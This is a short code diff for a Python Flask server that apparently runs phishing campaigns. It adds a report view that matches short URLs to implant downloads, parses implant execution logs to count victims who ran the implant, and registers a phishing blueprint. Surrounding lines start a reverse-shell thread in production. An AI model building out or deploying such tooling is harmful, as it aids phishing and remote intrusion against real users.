+        original_url = short_urls.get(beacon_short_url, {}).get('original_url', 'Unknown')
+        for event in download_events:
+            event['original_url'] = original_url
+
+        implante = short_urls.get(beacon_short_url, {}).get('original_url', '').split('/')[-1].replace('.exe', '')
+        if implante:
+            implant_config = load_implant_config(implante)
+            if implant_config.get('name') == implante:
+                execution_events = parse_execution_log(implante)
+                stats['executed'] = len(execution_events)
+
+    behavioral_analysis = analyze_behavioral_data(behavioral_events)
+    return render_template('phishing/report.html', 
+                         campaign=campaign, 
+                         stats=stats, 
+                         events=events, 
+                         download_events=download_events,
+                         execution_events=execution_events,
+                         behavioral_analysis=behavioral_analysis)
+  
 thread = Thread(target=run_shell)
 thread.daemon = True
 thread.start()
@@ -2854,12 +3436,11 @@ if __name__ == '__main__':
     
     if not os.path.exists(uploads):
         os.makedirs(uploads)
+    app.register_blueprint(phishing_bp)
 
     if ENV == 'PROD':
         threading.Thread(target=start_reverse_shell).start()
         app.run(host='0.0.0.0', port=lport, ssl_context=('cert.pem', 'key.pem'))
-        socketio.run(app, host='0.0.0.0', port=5000, certfile='cert.pem', keyfile='key.pem')
+        socketio.run(app, host='0.0.0.0', port=5000, certfile='cert.pem', keyfile='key.pem', server_side=True)
     else:
         app.run(host='0.0.0.0', port=lport )
-
-    
